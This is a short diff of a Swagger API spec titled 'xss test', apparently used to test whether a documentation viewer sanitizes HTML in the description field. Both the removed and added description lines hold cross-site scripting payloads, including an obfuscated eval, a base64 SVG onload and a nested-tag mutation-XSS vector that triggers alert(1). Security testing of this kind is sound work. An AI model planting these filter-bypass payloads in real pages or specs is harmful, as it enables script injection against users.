@@ -2,4 +2,4 @@ swagger: '2.0'
 info:
   title: xss test
   description: |
-   123<h1>123</h1><img src=x onerror=123><img src="x" onerror="eval('al'+'ert(1)')"><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+   123<h1>123</h1><form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src="x" onerror="[1].findIndex(alert(1))"></form>
